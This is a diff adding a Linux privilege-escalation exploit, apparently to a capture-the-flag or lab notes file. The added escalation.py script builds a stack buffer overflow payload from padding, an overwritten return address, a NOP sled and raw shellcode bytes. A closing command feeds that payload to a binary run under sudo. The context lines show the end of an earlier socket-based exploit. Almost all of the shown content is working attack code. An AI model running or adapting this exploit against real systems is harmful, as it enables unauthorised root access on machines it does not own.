@@ -170,9 +170,29 @@ s.send(buf)
 print s.recv(1024)
 
 s.close()
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------
+         ###LINUX EXPLOIT###
+(escalation.py)
+#!/usr/bin/env python
+#0xf7df1b51 -> 0xf7 df 1b 51 -> "\x51\x1b\xdf\xf7"
+#0xf7f6674b -> 0xf7 f6 67 4b -> "\x4b\x67\xf6\xf7"
+#0xf7f72753 -> 0xf7 f7 27 53 -> "\x53\x27\xf7\xf7"
+#0xf7f72c6b -> 0xf7 f7 2c 6b -> "\x6b\x2c\xf7\xf7"
+buffer = "A" * 76
+eip = "\x51\x1b\xdf\xf7"
+nop = '\x90' * 15
+buf =  b""
+buf += b"\xda\xd8\xd9\x74\x24\xf4\x58\x29\xc9\xb1\x10\xbb"
+buf += b"\x95\xb8\x84\xe0\x31\x58\x17\x03\x58\x17\x83\x55"
+buf += b"\xbc\x66\x15\x3f\xb6\x3e\x4f\xed\xae\xd6\x42\x72"
+buf += b"\xa6\xc0\xf5\x5b\xcb\x66\x06\xcb\x04\x15\x6f\x65"
+buf += b"\xd2\x3a\x3d\x91\xfd\xbc\xc2\x61\xd1\x92\xb1\x04"
+buf += b"\x4e\x99\x50\xb2\xbf\x73\xed\x5f\xb2\xf2\x62\xfa"
+buf += b"\x51\x77\xe0\x70\xb8\x07\x8e\x1a\xc4\xb0\x1d\x53"
+buf += b"\x25\xf3\x22"
+print(buffer+eip+nop+buf)
 
-
+sudo /.hidden/inventory.exe <<<$(./escalation.pu)
 
 
 
